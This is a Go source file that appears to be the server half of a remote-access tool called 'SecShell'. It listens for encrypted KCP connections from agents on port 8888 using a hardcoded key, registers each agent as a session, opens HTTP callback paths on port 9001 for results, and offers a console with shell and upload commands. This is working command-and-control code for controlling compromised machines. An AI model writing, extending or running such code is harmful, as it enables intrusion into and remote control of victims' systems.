package main

import (
	"SecShell/goroutes"
	"SecShell/server/console"
	"SecShell/util"
	"bytes"
	"crypto/sha1"
	"fmt"
	"github.com/xtaci/kcp-go/v5"
	"golang.org/x/crypto/pbkdf2"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"time"
)

func HttpPostResult(w http.ResponseWriter, r *http.Request) {
	rs, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(fmt.Sprintf(console.Clearln+"%v", string(rs)))
}

func HttpHandle() {
	s := http.Server{
		Addr: "0.0.0.0:9001",
	}
	err := s.ListenAndServe()
	if err != nil {
		log.Fatal(err)
	}
}

func NewHttpPath(path string) {
	http.HandleFunc(path, HttpPostResult)
	fmt.Println(console.Clearln+"[+] new http path", path)
}

func main() {
	key := pbkdf2.Key([]byte("@SDW*##@SZZCSDGDSA2"), []byte("salt"), 1024, 32, sha1.New) // 新建一个加密算法
	block, _ := kcp.NewAESBlockCrypt(key)
	listen, err := kcp.ListenWithOptions("0.0.0.0:8888", block, 10, 3)
	//listen, err := net.Listen("tcp","0.0.0.0:40300")
	if err != nil {
		fmt.Println("create kcp listen is failed")
		os.Exit(1)
	}
	go HttpHandle()
	go func(listener *kcp.Listener) {
		for {
			conn, err := listen.AcceptKCP()
			if err != nil {
				fmt.Println("[x] listen kcp conn ", err)
			}
			// 接收到一个会话，发布一个添加消息
			//fmt.Println()
			data := util.UnPackagingInfo(conn)
			//log.Println(data)
			var id = goroutes.NextJobID()
			goroutes.Jobs.Add(&goroutes.Job{
				ID:          id,
				Name:        data.AgentId,
				Description: data.Platform,
				Conn:        conn,
				Info:        data,
			})
			fmt.Println(console.Clearln+"\n[+] 😁 new connect from", conn.RemoteAddr())
			go NewHttpPath(data.ResponseURL)
			go HandleConnection(conn, id)
		}
	}(listen)
	console.ServiceConsole()
}

func HandleConnection(conn *kcp.UDPSession, id int) {
	for {
		data := util.UnPackagingInfo(conn)
		//fmt.Println(data)
		conn.SetStreamMode(true)
		err := conn.SetReadDeadline(time.Now().Add(time.Duration(6) * time.Second))
		if err != nil {
			return
		}
		if data.Response == nil {
			fmt.Println(data.AgentId)
			if console.Sessions != nil && console.Sessions.ID == id {
				console.App.SetDefaultPrompt()
				console.App.Commands().Del("background")
				console.App.Commands().Del("shell")
				console.App.Commands().Del("info")
				console.App.Commands().Del("upload")
				//session.Debug = false
				console.Sessions = nil
			}
			fmt.Println(fmt.Sprintf(console.Clearln+"[*] 🔥 session %v is close", id))
			goroutes.Jobs.Remove(goroutes.Jobs.Get(id))
			break
		}
		if bytes.Contains(data.Response, []byte("heart-beat")) {
			// 如果response为nil,则当条消息为心跳
			//fmt.Println("heart")
			continue
		} else {
			// 非心跳，将数据采用发布订阅模型发布
			//fmt.Printf(fmt.Sprintf("%v",string(data.Response)))
		}

	}
}
